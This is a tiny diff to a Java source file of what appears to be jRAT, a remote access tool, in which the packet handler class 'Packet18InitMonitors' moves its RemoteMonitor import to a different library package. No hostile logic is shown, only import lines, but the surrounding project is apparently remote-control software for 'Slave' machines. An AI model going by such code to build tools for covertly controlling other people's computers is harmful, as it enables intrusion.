@@ -1,10 +1,9 @@
 package io.jrat.controller.packets.incoming;
 
+import graphslib.monitors.RemoteMonitor;
 import io.jrat.controller.Slave;
 
 import java.io.DataInputStream;
-
-import com.redpois0n.graphs.monitors.RemoteMonitor;
 
 
 public class Packet18InitMonitors extends AbstractIncomingPacket {
